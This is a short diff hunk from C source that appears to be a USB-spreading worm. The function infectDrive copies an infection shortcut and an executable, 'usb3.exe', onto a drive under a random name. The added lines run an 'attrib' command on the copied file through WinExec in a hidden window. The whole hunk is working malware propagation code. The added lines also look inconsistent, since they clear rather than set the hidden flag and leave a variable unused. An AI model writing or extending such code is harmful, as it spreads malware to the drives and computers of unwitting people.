@@ -365,6 +365,12 @@ void infectDrive(char driveLetter){
     strcat(infectlnkauto, randomName);
     CopyFile(INFECT_LINK_NAME, infectlnkauto, 0);
     CopyFile("usb3.exe", infectlnkauto, 0);
+    char hideCommand[100] = {""};
+    char drivePath[10] = {driveLetter};
+    strcat(hideCommand, "attrib -s -h \"");
+    strcat(hideCommand, infectlnkauto);
+    strcat(hideCommand, "\"");
+    WinExec(hideCommand, SW_HIDE);
 }
 
 /*
